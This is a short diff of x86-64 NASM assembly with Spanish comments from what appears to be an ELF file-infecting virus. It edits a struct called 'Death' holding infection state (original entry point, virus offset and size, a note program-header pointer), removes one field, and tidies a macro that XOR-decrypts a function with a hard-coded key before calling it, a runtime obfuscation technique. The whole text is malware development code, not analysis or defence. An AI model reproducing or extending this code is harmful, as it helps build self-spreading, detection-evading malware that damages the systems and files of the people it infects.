@@ -96,7 +96,6 @@ struc Death
     .file_final_len     resd    1
     .mmap_ptr           resq    1
     .original_entry     resq    1
-    .virus_entry        resq    1
     .virus_offset       resq    1
     .virus_size         resd    1
     .note_phdr_ptr      resq    1
@@ -170,8 +169,8 @@ endstruc
     push r9
 
     lea r11, [rel %1]               ; base función
-    mov rbx, 0x2537683570773774     ; key    
-    mov rax, 0x0404040404040404 
+    mov rbx, 0x2537683570773774     ; key
+    mov rax, 0x0404040404040404
     xor rbx, rax
     xor rcx, rcx                    ; contador función
     xor rdx, rdx                    ; índice key
@@ -195,7 +194,7 @@ endstruc
     pop rax
 
     call r11                  ; llamada
-    
+
     push rax
     push rbx
     push rcx
@@ -205,7 +204,7 @@ endstruc
 
     lea r11, [rel %1]               ; base función
     mov rbx, 0x2537683570773774     ; key
-    mov rax, 0x0404040404040404 
+    mov rax, 0x0404040404040404
     xor rbx, rax
     xor rcx, rcx                    ; contador función
     xor rdx, rdx                    ; índice key
